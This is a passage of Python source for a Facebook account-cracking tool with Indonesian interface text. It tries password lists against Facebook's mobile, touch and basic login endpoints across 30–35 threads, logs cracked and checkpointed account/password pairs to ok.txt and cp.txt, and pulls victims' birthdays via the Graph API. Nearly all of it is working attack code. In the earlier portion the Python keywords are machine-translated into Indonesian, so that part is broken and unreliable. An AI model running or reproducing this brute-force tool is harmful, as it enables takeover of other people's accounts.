    r.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent" :"Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/240.0.0.9.115; ]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":" gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    untuk saya di b('masukan'):
        jika i.get('nilai') adalah Tidak Ada:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('nama') == 'lulus':
                data.update({'pass': pas})
            kalau tidak:
                data.update({i.get('nama'): ''})
        kalau tidak:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd',
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv= 100', data=data).teks
    jika 'c_user' di r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    kalau tidak:
        jika 'pos pemeriksaan' di r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        kalau tidak:
            return {'status': 'error', 'email': em, 'pass': pas}

        kembali

def touch_fb(em,pas,hosts):
	global ua,touch_fbh
	r=permintaan.Session()
	r.headers.update({"Host":"touch.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent" :"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, seperti Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml; q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q= 0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://touch.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	untuk saya di b("masukan"):
		jika i.get("nilai") adalah Tidak Ada:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("nama")=="lulus":
				data.update({"pass":pas})
			kalau tidak:
				data.update({i.get("name"):""})
		kalau tidak:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://touch.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv= 100",data=data).teks
	jika "c_user" di r.cookies.get_dict().keys():
		kembali {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "pos pemeriksaan" di r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}#touch fb


### KERETAK BRUTE ###
	
celah kelas:
	os.system("hapus")
	spanduk()
	def __init__(sendiri,isifile):
		diri.ada=[]
		diri.cp=[]
		diri.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Dengan Pass Default/Manual [d/m]"))
		sementara Benar:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Pilih : ")
			jika f="":lanjutkan
			elif f=="m":
				mencoba:
					sementara Benar:
						mencoba:
							self.apk=isifile
							self.fs=buka(self.apk).read().splitlines()
							merusak
						kecuali Pengecualian sebagai e:
							cetak(("%s"%e))
							melanjutkan
					diri.fl=[]
					untuk saya di self.fs:
						mencoba:
							self.fl.append({"id":i.split("<=>")[0]})
						kecuali: lanjutkan
				kecuali Pengecualian sebagai e:
					cetak(("%s"%e))
					melanjutkan
				print((p+" ["+k+"•"+m+"•"+p+"] Contoh : sayang,kontol,123456"))
				diri.pwlist()
				merusak
			elif f="d":
				mencoba:
					sementara Benar:
						mencoba:
							self.apk=isifile
							self.fs=buka(self.apk).read().splitlines()
							merusak
						kecuali Pengecualian sebagai e:
							cetak(("%s"%e))
							melanjutkan
					diri.fl=[]
					untuk saya di self.fs:
						mencoba:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						kecuali: lanjutkan
				kecuali Pengecualian sebagai e:
					cetak(("%s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Retak Dimulai..."+p+"\n ["+k+"•"+m+"•"+p+"] Akun [OK] Disimpan ke : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Akun [CP] Disimpan ke : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				keluar()
				merusak
	def pwlist (diri):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Daftar Kata Sandi : ").split(",")
		if len(self.pw) ==0:
			diri.pwlist()
		kalau tidak:
			untuk saya di self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Retak Dimulai..."+p+"\n ["+k+"•"+m+"•"+p+"] Akun [OK] Disimpan ke : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Akun [CP] Disimpan ke : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			keluar()
	def main(sendiri, fl):
		mencoba:
			untuk saya di fl.get("pw"):
				log=dasar(fl.get("id"),
					saya,"https://mbasic.facebook.com")
				jika log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s\n "%(fl.get("id"),i,)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					buka("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					merusak
				elif log.get("status")=="berhasil":
					print(("\r\x1b[0;32m * --> %s • %s "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					buka("ok.txt",,"a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					merusak
				lain: lanjutkan
					
			diri.ko+=1
			print("\r\x1b[0;37m [Retak]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m" %(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		kecuali:
			diri.main(fl)

kelas crackttl:
	os.system("hapus")
	spanduk()
	def __init__(sendiri,isifile):
		diri.ada=[]
		diri.cp=[]
		diri.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Dengan Pass Default/Manual [d/m]"))
		sementara Benar:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Pilih : ")
			jika f="":lanjutkan
			elif f=="m":
				mencoba:
					sementara Benar:
						mencoba:
							self.apk=isifile
							self.fs=buka(self.apk).read().splitlines()
							merusak
						kecuali Pengecualian sebagai e:
							cetak(("%s"%e))
							melanjutkan
					diri.fl=[]
					untuk saya di self.fs:
						mencoba:
							self.fl.append({"id":i.split("<=>")[0]})
						kecuali: lanjutkan
				kecuali Pengecualian sebagai e:
					cetak(("%s"%e))
					melanjutkan
				print((p+" ["+k+"•"+m+"•"+p+"] Contoh : sayang,kontol,123456"))
				diri.pwlist()
				merusak
			elif f="d":
				mencoba:
					sementara Benar:
						mencoba:
							self.apk=isifile
							self.fs=buka(self.apk).read().splitlines()
							merusak
						kecuali Pengecualian sebagai e:
							cetak(("%s"%e))
							melanjutkan
					diri.fl=[]
					untuk saya di self.fs:
						mencoba:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						kecuali: lanjutkan
				kecuali Pengecualian sebagai e:
					cetak(("%s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Retak Dimulai..."+p+"\n ["+k+"•"+m+"•"+p+"] Akun [OK] Disimpan ke : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Akun [CP] Disimpan ke : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				keluar()
				merusak
	def pwlist (diri):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Daftar Kata Sandi : ").split(",")
		if len(self.pw) ==0:
			diri.pwlist()
		kalau tidak:
			untuk saya di self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Retak Dimulai..."+p+"\n ["+k+"•"+m+"•"+p+"] Akun [OK] Disimpan ke : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Akun [CP] Disimpan ke : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			keluar()
	def main(sendiri, fl):
		mencoba:
			untuk saya di fl.get("pw"):
				log=dasar(fl.get("id"),
					saya,"https://mbasic.facebook.com")
				jika log.get("status")=="cp":
					mencoba:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read() )
						tt=json.loads(ke.teks)
						ttl=tt["ulang tahun"]
					kecuali: lulus
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					buka("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					merusak
				elif log.get("status")=="berhasil":
					print(("\r\x1b[0;32m * --> %s • %s "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					jika fl.get("id") di open("ok.txt").read():
						merusak
					kalau tidak:
						buka("ok.txt",,"a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					merusak
				lain: lanjutkan
					
			diri.ko+=1
			print("\r\x1b[0;37m [Retak]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m" %(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		kecuali:
			diri.main(fl)

crekm kelas:
	os.system("hapus")
	spanduk()
	def __init__(sendiri,isifile):
		diri.ada=[]
		diri.cp=[]
		diri.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Dengan Pass Default/Manual [d/m]"))
		sementara Benar:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Pilih : ")
			jika f="":lanjutkan
			elif f=="m":
				mencoba:
					sementara Benar:
						mencoba:
							self.apk=isifile
							self.fs=buka(self.apk).read().splitlines()
							merusak
						kecuali Pengecualian sebagai e:
							cetak(("%s"%e))
							melanjutkan
					diri.fl=[]
					untuk saya di self.fs:
						mencoba:
							self.fl.append({"id":i.split("<=>")[0]})
						kecuali: lanjutkan
				kecuali Pengecualian sebagai e:
					cetak(("%s"%e))
					melanjutkan
				print((p+" ["+k+"•"+m+"•"+p+"] Contoh : sayang,kontol,123456"))
				diri.pwlist()
				merusak
			elif f="d":
				mencoba:
					sementara Benar:
						mencoba:
							self.apk=isifile
							self.fs=buka(self.apk).read().splitlines()
							merusak
						kecuali Pengecualian sebagai e:
							cetak(("%s"%e))
							melanjutkan
					diri.fl=[]
					untuk saya di self.fs:
						mencoba:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						kecuali: lanjutkan
				kecuali Pengecualian sebagai e:
					cetak(("%s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Retak Dimulai..."+p+"\n ["+k+"•"+m+"•"+p+"] Akun [OK] Disimpan ke : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Akun [CP] Disimpan ke : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				keluar()
				merusak
	def pwlist (diri):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Daftar Kata Sandi : ").split(",")
		if len(self.pw) ==0:
			diri.pwlist()
		kalau tidak:
			untuk saya di self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Retak Dimulai..."+p+"\n ["+k+"•"+m+"•"+p+"] Akun [OK] Disimpan ke : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Akun [CP] Disimpan ke : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			keluar()
	def main(sendiri, fl):
		mencoba:
			untuk saya di fl.get("pw"):
				log=m_fb(fl.get("id"),
					saya,"https://m.facebook.com")
				jika log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s\n "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					buka("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					merusak
				elif log.get("status")=="berhasil":
					print(("\r\x1b[0;32m * --> %s • %s "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					buka("ok.txt",,"a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					merusak
				lain: lanjutkan
					
			diri.ko+=1
			print("\r\x1b[0;37m [Retak]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m" %(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		kecuali:
			diri.main(fl)

kelas crekmttl:
	os.system("hapus")
	spanduk()
	def __init__(sendiri,isifile):
		diri.ada=[]
		diri.cp=[]
		diri.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Dengan Pass Default/Manual [d/m]"))
		sementara Benar:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Pilih : ")
			jika f="":lanjutkan
			elif f=="m":
				mencoba:
					sementara Benar:
						mencoba:
							self.apk=isifile
							self.fs=buka(self.apk).read().splitlines()
							merusak
						kecuali Pengecualian sebagai e:
							cetak(("%s"%e))
							melanjutkan
					diri.fl=[]
					untuk saya di self.fs:
						mencoba:
							self.fl.append({"id":i.split("<=>")[0]})
						kecuali: lanjutkan
				kecuali Pengecualian sebagai e:
					cetak(("%s"%e))
					melanjutkan
				print((p+" ["+k+"•"+m+"•"+p+"] Contoh : sayang,kontol,123456"))
				diri.pwlist()
				merusak
			elif f="d":
				mencoba:
					sementara Benar:
						mencoba:
							self.apk=isifile
							self.fs=buka(self.apk).read().splitlines()
							merusak
						kecuali Pengecualian sebagai e:
							cetak(("%s"%e))
							melanjutkan
					diri.fl=[]
					untuk saya di self.fs:
						mencoba:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						kecuali: lanjutkan
				kecuali Pengecualian sebagai e:
					cetak(("%s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=m_fb(fl.get("id"),
					i,"https://m.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class tofbe:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s\n               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class tofbettl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=touch_fb(fl.get("id"),
					i,"https://touch.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class freefb:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,freefacebook)
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s\n * --> %s • %s\n               "%(fl.get("id"),i)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print("\r\x1b[0;32m * --> %s • %s              "%(fl.get("id"),i))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class freefbttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
				ThreadPool(30).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n ["+k+"•"+m+"•"+p+"] Crack Started..."+p+"\n ["+k+"•"+m+"•"+p+"] Account [OK] Saved to : ok.txt"+p+"\n ["+k+"•"+m+"•"+p+"] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=f_fb(fl.get("id"),
					i,freefacebook)
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)

class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((p+"\n ["+k+"•"+m+"•"+p+"] Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(p+" ["+k+"•"+m+"•"+p+"] Choose : ")
      if f in[""," "]:
        print((p+" ["+k+"•"+m+"•"+p+"] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" ["+k+"•"+m+"•"+p+"] Example : sayang,kontol,123456"))
          self.pw=input(p+" ["+k+"•"+m+"•"+p+"] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
